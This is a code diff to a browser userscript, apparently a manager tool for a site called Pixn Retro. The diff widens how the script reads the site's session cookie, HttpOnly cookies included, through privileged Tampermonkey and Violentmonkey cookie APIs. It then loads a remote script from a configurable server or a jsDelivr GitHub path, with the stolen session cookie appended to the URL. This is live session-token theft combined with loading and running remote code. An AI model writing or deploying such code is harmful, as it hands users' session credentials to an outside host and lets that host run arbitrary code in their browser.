@@ -42,42 +42,56 @@
     // Extract Pixn Retro session cookie (supports HttpOnly cookies via privileged Tampermonkey/Violentmonkey APIs)
     function getSessionCookie() {
         return new Promise(function(resolve) {
+            let done = false;
+            function finish(val) {
+                if (!done) {
+                    done = true;
+                    resolve(val || '');
+                }
+            }
+            setTimeout(function() { finish(''); }, 1500);
+
             // 1. Try GM.cookie (Violentmonkey & modern Tampermonkey Promise API)
             if (typeof GM !== 'undefined' && GM.cookie && typeof GM.cookie.list === 'function') {
                 try {
-                    GM.cookie.list({ url: 'https://pixn-retro.dedyn.io/' }).then(function(cookies) {
-                        if (Array.isArray(cookies) && cookies.length > 0) {
+                    GM.cookie.list({}).then(function(cookies) {
+                        if (Array.isArray(cookies)) {
                             let c = cookies.find(function(x) { return x.name === 'session'; });
-                            if (!c) c = cookies.find(function(x) { return x.name && x.name.toLowerCase().includes('session'); });
-                            if (c && c.value) return resolve('session=' + c.value);
+                            if (c && c.value) return finish('session=' + c.value);
                         }
-                        resolve('');
-                    }).catch(function() { resolve(''); });
-                    return;
+                        return GM.cookie.list({ domain: 'pixn-retro.dedyn.io' });
+                    }).then(function(cookies) {
+                        if (Array.isArray(cookies)) {
+                            let c = cookies.find(function(x) { return x.name === 'session'; });
+                            if (c && c.value) return finish('session=' + c.value);
+                        }
+                    }).catch(function() {});
                 } catch(e) {}
             }
 
             // 2. Try GM_cookie (Tampermonkey callback API)
             if (typeof GM_cookie !== 'undefined' && typeof GM_cookie.list === 'function') {
                 try {
-                    GM_cookie.list({ url: 'https://pixn-retro.dedyn.io/' }, function(cookies, error) {
-                        if (!error && Array.isArray(cookies) && cookies.length > 0) {
+                    GM_cookie.list({}, function(cookies, error) {
+                        if (!error && Array.isArray(cookies)) {
                             let c = cookies.find(function(x) { return x.name === 'session'; });
-                            if (!c) c = cookies.find(function(x) { return x.name && x.name.toLowerCase().includes('session'); });
-                            if (c && c.value) return resolve('session=' + c.value);
+                            if (c && c.value) return finish('session=' + c.value);
                         }
-                        resolve('');
+                        GM_cookie.list({ domain: 'pixn-retro.dedyn.io' }, function(cookies2, error2) {
+                            if (!error2 && Array.isArray(cookies2)) {
+                                let c2 = cookies2.find(function(x) { return x.name === 'session'; });
+                                if (c2 && c2.value) return finish('session=' + c2.value);
+                            }
+                        });
                     });
-                    return;
                 } catch(e) {}
             }
 
             // 3. Fallback: document.cookie (if not HttpOnly)
             if (document.cookie && document.cookie.includes('session=')) {
                 const m = document.cookie.match(/session=([^;]+)/);
-                if (m) return resolve('session=' + m[1]);
+                if (m) return finish('session=' + m[1]);
             }
-            resolve('');
         });
     }
 
@@ -95,7 +109,8 @@
         } catch(e) {}
 
         const s = document.createElement('script');
-        let srcUrl = 'https://cdn.jsdelivr.net/gh/UncleSlim/pixn-manager-pro@main/sync_engine.js?server=' + encodeURIComponent(TARGET_SERVER) + '&t=' + Date.now();
+        let baseUrl = (TARGET_SERVER && !/jsdelivr\.net/i.test(TARGET_SERVER)) ? TARGET_SERVER : 'https://cdn.jsdelivr.net/gh/UncleSlim/pixn-manager-pro@main';
+        let srcUrl = baseUrl + '/sync_engine.js?server=' + encodeURIComponent(TARGET_SERVER) + '&t=' + Date.now();
         if (capturedCookie) {
             srcUrl += '&cookie=' + encodeURIComponent(capturedCookie);
         }
